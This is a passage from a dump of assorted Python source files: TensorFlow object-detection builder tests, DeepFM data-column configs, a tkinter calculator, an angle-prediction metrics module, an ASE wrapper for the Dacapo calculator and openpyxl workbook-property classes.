text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "358": "TRAIN_FILE = \"DeepFM/data/train.csv\"\nTEST_FILE = \"DeepFM/data/test.csv\"\n\nNUMERIC_COLS = [\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\"\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "359": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]", "360": "import tkinter as tk\r\n\r\nwindow = tk.Tk()\r\n\r\nlbl_calc_result = tk.Label(\r\n    master= window,\r\n    text= '0',\r\n    width= 30,\r\n    height=3,\r\n)\r\nlbl_calc_result.grid(row=0, column=0 , columnspan=4)\r\n\r\ndef insert_number_in_calc_result(button_number):\r\n    current = lbl_calc_result['text']\r\n    if current == '0': \r\n        lbl_calc_result['text'] = button_number\r\n    elif button_number == '=':\r\n        lbl_calc_result['text'] = f'{eval(current)}'\r\n    else:\r\n        lbl_calc_result['text'] += button_number\r\n\r\n\r\ncalc_list = [\r\n    {\r\n        'text' : '7',\r\n        'command' : lambda:insert_number_in_calc_result('7'),\r\n    },\r\n    {\r\n        'text' : '8',\r\n        'command' : lambda:insert_number_in_calc_result('8'),\r\n    },\r\n    {\r\n        'text' : '9',\r\n        'command' : lambda:insert_number_in_calc_result('9'),\r\n    },\r\n    {\r\n        'text' : '+',\r\n        'command' : lambda:insert_number_in_calc_result('+'),\r\n    },\r\n        {\r\n        'text' : '4',\r\n        'command' : lambda:insert_number_in_calc_result('4'),\r\n    },\r\n    {\r\n        'text' : '5',\r\n        'command' : lambda:insert_number_in_calc_result('5'),\r\n    },\r\n    {\r\n        'text' : '6',\r\n        'command' : lambda:insert_number_in_calc_result('6'),\r\n    },\r\n    {\r\n        'text' : '-',\r\n        'command' : lambda:insert_number_in_calc_result('-'),\r\n    },\r\n            {\r\n        'text' : '1',\r\n        'command' : lambda:insert_number_in_calc_result('1'),\r\n    },\r\n    {\r\n        'text' : '2',\r\n        'command' : lambda:insert_number_in_calc_result('2'),\r\n    },\r\n    {\r\n        'text' : '3',\r\n        'command' : lambda:insert_number_in_calc_result('3'),\r\n    },\r\n    {\r\n        'text' : '*',\r\n        'command' : lambda:insert_number_in_calc_result('*'),\r\n    },\r\n                {\r\n        'text' : '.',\r\n        'command' : lambda:insert_number_in_calc_result('.'),\r\n    },\r\n    {\r\n        'text' : '0',\r\n        'command' : lambda:insert_number_in_calc_result('0'),\r\n    },\r\n    {\r\n        'text' : 'C',\r\n        'command' : lambda:insert_number_in_calc_result('C'),\r\n    },\r\n    {\r\n        'text' : '=',\r\n        'command' : lambda:insert_number_in_calc_result('='),\r\n    },\r\n    \r\n]\r\n\r\ncalc_key_objs = []\r\n\r\nfor calc_key_data in calc_list:\r\n    btn = tk.Button(\r\n        master= window,\r\n        text=calc_key_data['text'],\r\n        command=calc_key_data['command'],\r\n        height=3,\r\n    )\r\n    calc_key_objs.append(btn)\r\n\r\nfor i, calc_key_obj in enumerate(calc_key_objs):\r\n    calc_key_obj.grid(row=(i//4)+1, column=i%4, sticky='nsew')\r\n\r\n\r\n# btn7 = tk.Button(\r\n#     master= window,\r\n#     text='7',\r\n#     command= lambda: print('7'),\r\n#     height=3,\r\n# )\r\n# btn7.grid(row=1 , column=0, sticky='ewsn')\r\n\r\n\r\nwindow.mainloop()", "361": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "362": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "363": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "364": "import numpy as np\nfrom glob import glob\nimport os, errno\n\nfrom scipy import optimize, stats\n\nfrom sklearn.metrics import roc_auc_score\n\nfrom src_py.metrics_utils import calculate_deltas_unsigned, calculate_deltas_signed\n\n\ndef weight_fun(x, a, b, c):\n    return a + b * np.cos(x) + c * np.sin(x)\n\ndef calc_weights(num_classes, coeffs):\n    k2PI = 2* np.pi\n    x = np.linspace(0, k2PI, num_classes)\n    data_len = coeffs.shape[0]\n    weights = np.zeros((data_len, num_classes))\n    for i in range(data_len):\n        weights[i] = weight_fun(x, *coeffs[i])\n    return weights\n\ndef calc_argmaxs_distances(pred_arg_maxs, calc_arg_maxs, num_class):\n    return calculate_deltas_signed(calc_arg_maxs, pred_arg_maxs, num_class)\n\n\ndef calculate_metrics_from_file(directory, num_classes):\n    calc_w = np.load(os.path.join(directory, 'softmax_calc_w.npy'))\n    preds_w = np.load(os.path.join(directory, 'softmax_preds_w.npy'))\n    return calculate_metrics(calc_w, preds_w, num_classes)\n\n\ndef calculate_metrics(calc_w, preds_w, num_classes):\n    pred_arg_maxs = np.argmax(preds_w, axis=1)\n    calc_arg_maxs = np.argmax(calc_w, axis=1)\n\n    k2PI = 2 * np.pi\n    calc_pred_argmaxs_abs_distances = calculate_deltas_unsigned( pred_arg_maxs, calc_arg_maxs, num_classes)\n    calc_pred_argmaxs_signed_distances = calculate_deltas_signed(pred_arg_maxs, calc_arg_maxs, num_classes)\n    calc_pred_argmaxs_abs_distances_rad = calc_pred_argmaxs_abs_distances * k2PI/(1.0*num_classes)\n    \n    mean_deltas = np.mean(calc_pred_argmaxs_signed_distances, dtype=np.float64)\n    mean_deltas_err = stats.sem(calc_pred_argmaxs_signed_distances)\n    mean_deltas_rad = mean_deltas * k2PI/(1.0*num_classes)\n    mean_deltas_err_rad = mean_deltas_err * k2PI/(1.0*num_classes)\n\n    acc0 = (calc_pred_argmaxs_abs_distances <= 0).mean()\n    acc1 = (calc_pred_argmaxs_abs_distances <= 1).mean()\n    acc2 = (calc_pred_argmaxs_abs_distances <= 2).mean()\n    acc3 = (calc_pred_argmaxs_abs_distances <= 3).mean()\n\n    acc0_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.25).mean()\n    acc1_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.50).mean()\n    acc2_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.75).mean()\n    acc3_rad = (calc_pred_argmaxs_abs_distances_rad <= 1.00).mean()\n\n    l1_delta_w = np.mean(np.abs(calc_w - preds_w), dtype=np.float64)\n    l2_delta_w = np.sqrt(np.mean((calc_w - preds_w)**2), dtype=np.float64)\n\n    # calc_w, preds_w normalisation to probability\n    calc_w_norm = calc_w / np.sum(calc_w, axis=1)[:, np.newaxis]\n    preds_w_norm = preds_w / np.sum(preds_w, axis=1)[:, np.newaxis]\n \n    l1_delta_w_norm = np.mean(np.abs(calc_w_norm - preds_w_norm), dtype=np.float64)\n    l2_delta_w_norm = np.sqrt(np.mean((calc_w_norm - preds_w_norm)**2), dtype=np.float64)\n  \n    \n    return np.array([acc0, acc1, acc2, acc3, mean_deltas, l1_delta_w, l2_delta_w, mean_deltas_rad, acc0_rad, acc1_rad, acc2_rad, acc3_rad,l1_delta_w_norm, l2_delta_w_norm, mean_deltas_err, mean_deltas_err_rad, ]) \n\n\ndef calculate_metrics_regr_popts_from_file(directory, num_classes):\n    calc_popts = np.load(os.path.join(directory,'test_regr_calc_popts.npy'))\n    pred_popts = np.load(os.path.join(directory,'test_regr_preds_popts.npy'))\n\n    return calculate_metrics_regr_popts(calc_popts, pred_popts, num_classes)\n\n\ndef calculate_metrics_regr_popts(calc_popts, pred_popts, num_classes):\n    calc_w  = calc_weights(num_classes, calc_popts)\n    preds_w = calc_weights(num_classes, pred_popts)\n\n    return calculate_metrics(calc_w, preds_w, num_classes)\n\n\ndef get_filename_for_class(pathIN, class_num, subset=None):\n    d = '../monit_npy/nn_rhorho_Variant-All_Unweighted_False_NO_NUM_CLASSES_{class_num}'\n    if subset:\n        d += \"_WEIGHTS_SUBS\" + str(subset)\n    return d\n\n\n# The primary versions of three methods below were\n#  evaluate from tf_model.py\n#  evaluate2 from tf_model.py\n#  both using \n#  evaluate_preds  from tf_model.py\n# when extending to multi-class something is not correctly\n# implemented for handling numpy arrays. \n\n\ndef evaluate_roc_auc(preds, wa, wb):\n    n = len(preds)\n    true_labels = np.concatenate([np.ones(n), np.zeros(n)])\n    preds = np.concatenate([preds, preds])\n    weights = np.concatenate([wa, wb])\n    \n    return roc_auc_score(true_labels, preds, sample_weight=weights)\n\n\ndef calculate_roc_auc(preds_w, calc_w, index_a, index_b):\n    n, num_classes = calc_w.shape\n    true_labels = np.concatenate([np.ones(n), np.zeros(n)])\n    preds = np.concatenate([preds_w[:, index_a], preds_w[:, index_a]])\n    weights = np.concatenate([calc_w[:, index_a], calc_w[:, index_b]])\n\n    return roc_auc_score(true_labels, preds, sample_weight=weights)\n\n# binary classification\ndef test_roc_auc(directory, num_class):\n    calc_w = np.load(os.path.join(directory, 'softmax_calc_w.npy'))\n    preds_w = np.load(os.path.join(directory, 'softmax_preds_w.npy'))\n    \n    oracle_roc_auc = []\n    preds_roc_auc  = []\n    \n    for i in range(0, num_class):\n         oracle_roc_auc  += [calculate_roc_auc(calc_w, calc_w, 0, i)]\n         preds_roc_auc   += [calculate_roc_auc(preds_w, calc_w, 0, i)]\n         print(i,\n                  'oracle_roc_auc: {}'.format(calculate_roc_auc(calc_w, calc_w, 0, i)),\n                  'preds_roc_auc: {}'.format(calculate_roc_auc(preds_w, calc_w, 0, i)))\n\n    return oracle_roc_auc, preds_roc_auc\n", "365": "import numpy as np\n\nfrom ase.old import OldASEListOfAtomsWrapper\n\ntry:\n    import Numeric as num\nexcept ImportError:\n    pass\n\ndef np2num(a, typecode=None):\n    if num.__version__ > '23.8':\n        return num.array(a, typecode)\n    if typecode is None:\n        typecode = num.Float\n    b = num.fromstring(a.tostring(), typecode)\n    b.shape = a.shape\n    return b\n\ndef restart(filename, **kwargs):\n    calc = Dacapo(filename, **kwargs)\n    atoms = calc.get_atoms()\n    return atoms, calc\n\nclass Dacapo:\n    def __init__(self, filename=None, stay_alive=False, stress=False,\n                 **kwargs):\n\n        self.kwargs = kwargs\n        self.stay_alive = stay_alive\n        self.stress = stress\n        \n        if filename is not None:\n            from Dacapo import Dacapo\n            self.loa = Dacapo.ReadAtoms(filename, **kwargs)\n            self.calc = self.loa.GetCalculator()\n        else:\n            self.loa = None\n            self.calc = None\n\n        self.pps = []\n        \n    def set_pp(self, Z, path):\n        self.pps.append((Z, path))\n\n    def set_txt(self, txt):\n        if self.calc is None:\n            self.kwargs['txtout'] = txt\n        else:\n            self.calc.SetTxtFile(txt)\n\n    def set_nc(self, nc):\n        if self.calc is None:\n            self.kwargs['out'] = nc\n        else:\n            self.calc.SetNetCDFFile(nc)\n\n    def update(self, atoms):\n        from Dacapo import Dacapo\n        if self.calc is None:\n            if 'nbands' not in self.kwargs:\n                n = sum([valence[atom.symbol] for atom in atoms])\n                self.kwargs['nbands'] = int(n * 0.65) + 4\n\n            magmoms = atoms.get_initial_magnetic_moments()\n            if magmoms.any():\n                self.kwargs['spinpol'] = True\n\n            self.calc = Dacapo(**self.kwargs)\n\n            if self.stay_alive:\n                self.calc.StayAliveOn()\n            else:\n                self.calc.StayAliveOff()\n\n            if self.stress:\n                self.calc.CalculateStress()\n\n            for Z, path in self.pps:\n                self.calc.SetPseudoPotential(Z, path)\n\n        if self.loa is None:\n            from ASE import Atom, ListOfAtoms\n            numbers = atoms.get_atomic_numbers()\n            positions = atoms.get_positions()\n            magmoms = atoms.get_initial_magnetic_moments()\n            self.loa = ListOfAtoms([Atom(Z=numbers[a],\n                                         position=positions[a],\n                                         magmom=magmoms[a])\n                                    for a in range(len(atoms))],\n                                   cell=np2num(atoms.get_cell()),\n                                   periodic=tuple(atoms.get_pbc()))\n            self.loa.SetCalculator(self.calc)\n        else:\n            self.loa.SetCartesianPositions(np2num(atoms.get_positions()))\n            self.loa.SetUnitCell(np2num(atoms.get_cell()), fix=True)\n            \n    def get_atoms(self):\n        atoms = OldASEListOfAtomsWrapper(self.loa).copy()\n        atoms.set_calculator(self)\n        return atoms\n    \n    def get_potential_energy(self, atoms):\n        self.update(atoms)\n        return self.calc.GetPotentialEnergy()\n\n    def get_forces(self, atoms):\n        self.update(atoms)\n        return np.array(self.calc.GetCartesianForces())\n\n    def get_stress(self, atoms):\n        self.update(atoms)\n        stress = np.array(self.calc.GetStress())\n        if stress.ndim == 2:\n            return stress.ravel()[[0, 4, 8, 5, 2, 1]]\n        else:\n            return stress\n\n    def calculation_required(self, atoms, quantities):\n        if self.calc is None:\n            return True\n\n        if atoms != self.get_atoms():\n            return True\n\n        return False\n        \n    def get_number_of_bands(self):\n        return self.calc.GetNumberOfBands()\n\n    def get_k_point_weights(self):\n        return np.array(self.calc.GetIBZKPointWeights())\n\n    def get_number_of_spins(self):\n        return 1 + int(self.calc.GetSpinPolarized())\n\n    def get_eigenvalues(self, kpt=0, spin=0):\n        return np.array(self.calc.GetEigenvalues(kpt, spin))\n\n    def get_fermi_level(self):\n        return self.calc.GetFermiLevel()\n\n    def get_magnetic_moment(self):\n        return self.calc.GetMagneticMoment()\n\n    def get_number_of_electrons(self):\n        return self.calc.GetValenceElectrons()\n\n    def get_number_of_grid_points(self):\n        return np.array(self.get_pseudo_wave_function(0, 0, 0).shape)\n\n    def get_pseudo_density(self, spin=0):\n        return np.array(self.calc.GetDensityArray(spin))\n    \n    def get_pseudo_wave_function(self, band=0, kpt=0, spin=0, pad=True):\n        kpt_c = self.get_bz_k_points()[kpt]\n        state = self.calc.GetElectronicStates().GetState(band=band, spin=spin,\n                                                         kptindex=kpt)\n\n        # Get wf, without bloch phase (Phase = True doesn't do anything!)\n        wave = state.GetWavefunctionOnGrid(phase=False)\n\n        # Add bloch phase if this is not the Gamma point\n        if np.all(kpt_c == 0):\n            return wave\n        coord = state.GetCoordinates()\n        phase = coord[0] * kpt_c[0] + coord[1] * kpt_c[1] + coord[2] * kpt_c[2]\n        return np.array(wave) * np.exp(-2.j * np.pi * phase) # sign! XXX\n\n        #return np.array(self.calc.GetWaveFunctionArray(n, k, s)) # No phase!\n\n    def get_bz_k_points(self):\n        return np.array(self.calc.GetBZKPoints())\n\n    def get_ibz_k_points(self):\n        return np.array(self.calc.GetIBZKPoints())\n\n    def get_wannier_localization_matrix(self, nbands, dirG, kpoint,\n                                        nextkpoint, G_I, spin):\n        return np.array(self.calc.GetWannierLocalizationMatrix(\n            G_I=G_I.tolist(), nbands=nbands, dirG=dirG.tolist(),\n            kpoint=kpoint, nextkpoint=nextkpoint, spin=spin))\n    \n    def initial_wannier(self, initialwannier, kpointgrid, fixedstates,\n                        edf, spin):\n        # Use initial guess to determine U and C\n        init = self.calc.InitialWannier(initialwannier, self.atoms,\n                                        np2num(kpointgrid, num.Int))\n\n        states = self.calc.GetElectronicStates()\n        waves = [[state.GetWaveFunction()\n                  for state in states.GetStatesKPoint(k, spin)]\n                 for k in self.calc.GetIBZKPoints()]\n\n        init.SetupMMatrix(waves, self.calc.GetBZKPoints())\n        c, U = init.GetListOfCoefficientsAndRotationMatrices(\n            (self.calc.GetNumberOfBands(), fixedstates, edf))\n        U = np.array(U)\n        for k in range(len(c)):\n            c[k] = np.array(c[k])\n        return c, U\n\nvalence = {\n'H':   1,\n'B':   3,\n'C':   4,\n'N':   5,\n'O':   6,\n'Li':  1,\n'Na':  1,\n'K':   9,\n'Mg':  8,\n'Ca': 10,\n'Sr': 10,\n'Al':  3,\n'Ga': 13,\n'Sc': 11,\n'Ti': 12,\n'V':  13,\n'Cr': 14,\n'Mn':  7,\n'Fe':  8,\n'Co':  9,\n'Ni': 10,\n'Cu': 11,\n'Zn': 12,\n'Y':  11,\n'Zr': 12,\n'Nb': 13,\n'Mo':  6,\n'Ru':  8,\n'Rh':  9,\n'Pd': 10,\n'Ag': 11,\n'Cd': 12,\n'Ir': 9,\n'Pt': 10,\n'Au': 11,\n}\n", "366": "# Copyright (c) 2010-2020 openpyxl\n\nfrom openpyxl.descriptors.serialisable import Serialisable\nfrom openpyxl.descriptors import (\n    String,\n    Float,\n    Integer,\n    Bool,\n    NoneSet,\n    Set,\n)\n\nfrom openpyxl.descriptors.excel import Guid\n\n\nclass WorkbookProperties(Serialisable):\n\n    tagname = \"workbookPr\"\n\n    date1904 = Bool(allow_none=True)\n    dateCompatibility = Bool(allow_none=True)\n    showObjects = NoneSet(values=(['all', 'placeholders']))\n    showBorderUnselectedTables = Bool(allow_none=True)\n    filterPrivacy = Bool(allow_none=True)\n    promptedSolutions = Bool(allow_none=True)\n    showInkAnnotation = Bool(allow_none=True)\n    backupFile = Bool(allow_none=True)\n    saveExternalLinkValues = Bool(allow_none=True)\n    updateLinks = NoneSet(values=(['userSet', 'never', 'always']))\n    codeName = String(allow_none=True)\n    hidePivotFieldList = Bool(allow_none=True)\n    showPivotChartFilter = Bool(allow_none=True)\n    allowRefreshQuery = Bool(allow_none=True)\n    publishItems = Bool(allow_none=True)\n    checkCompatibility = Bool(allow_none=True)\n    autoCompressPictures = Bool(allow_none=True)\n    refreshAllConnections = Bool(allow_none=True)\n    defaultThemeVersion = Integer(allow_none=True)\n\n    def __init__(self,\n                 date1904=None,\n                 dateCompatibility=None,\n                 showObjects=None,\n                 showBorderUnselectedTables=None,\n                 filterPrivacy=None,\n                 promptedSolutions=None,\n                 showInkAnnotation=None,\n                 backupFile=None,\n                 saveExternalLinkValues=None,\n                 updateLinks=None,\n                 codeName=None,\n                 hidePivotFieldList=None,\n                 showPivotChartFilter=None,\n                 allowRefreshQuery=None,\n                 publishItems=None,\n                 checkCompatibility=None,\n                 autoCompressPictures=None,\n                 refreshAllConnections=None,\n                 defaultThemeVersion=None,\n                ):\n        self.date1904 = date1904\n        self.dateCompatibility = dateCompatibility\n        self.showObjects = showObjects\n        self.showBorderUnselectedTables = showBorderUnselectedTables\n        self.filterPrivacy = filterPrivacy\n        self.promptedSolutions = promptedSolutions\n        self.showInkAnnotation = showInkAnnotation\n        self.backupFile = backupFile\n        self.saveExternalLinkValues = saveExternalLinkValues\n        self.updateLinks = updateLinks\n        self.codeName = codeName\n        self.hidePivotFieldList = hidePivotFieldList\n        self.showPivotChartFilter = showPivotChartFilter\n        self.allowRefreshQuery = allowRefreshQuery\n        self.publishItems = publishItems\n        self.checkCompatibility = checkCompatibility\n        self.autoCompressPictures = autoCompressPictures\n        self.refreshAllConnections = refreshAllConnections\n        self.defaultThemeVersion = defaultThemeVersion\n\n\nclass CalcProperties(Serialisable):\n\n    tagname = \"calcPr\"\n\n    calcId = Integer()\n    calcMode = NoneSet(values=(['manual', 'auto', 'autoNoTable']))\n    fullCalcOnLoad = Bool(allow_none=True)\n    refMode = NoneSet(values=(['A1', 'R1C1']))\n    iterate = Bool(allow_none=True)\n    iterateCount = Integer(allow_none=True)\n    iterateDelta = Float(allow_none=True)\n    fullPrecision = Bool(allow_none=True)\n    calcCompleted = Bool(allow_none=True)\n    calcOnSave = Bool(allow_none=True)\n    concurrentCalc = Bool(allow_none=True)\n    concurrentManualCount = Integer(allow_none=True)\n    forceFullCalc = Bool(allow_none=True)\n\n    def __init__(self,\n                 calcId=124519,\n                 calcMode=None,\n                 fullCalcOnLoad=True,\n                 refMode=None,\n                 iterate=None,\n                 iterateCount=None,\n                 iterateDelta=None,\n                 fullPrecision=None,\n                 calcCompleted=None,\n                 calcOnSave=None,\n                 concurrentCalc=None,\n                 concurrentManualCount=None,\n                 forceFullCalc=None,\n                ):\n        self.calcId = calcId\n        self.calcMode = calcMode\n        self.fullCalcOnLoad = fullCalcOnLoad\n        self.refMode = refMode\n        self.iterate = iterate\n        self.iterateCount = iterateCount\n        self.iterateDelta = iterateDelta\n        self.fullPrecision = fullPrecision\n        self.calcCompleted = calcCompleted\n        self.calcOnSave = calcOnSave\n        self.concurrentCalc = concurrentCalc\n        self.concurrentManualCount = concurrentManualCount\n        self.forceFullCalc = forceFullCalc\n\n\nclass FileVersion(Serialisable):\n\n    tagname = \"fileVersion\"\n\n    appName = String(allow_none=True)\n    lastEdited = String(allow_none=True)\n    lowestEdited = String(allow_none=True)\n    rupBuild = String(allow_none=True)\n    codeName = 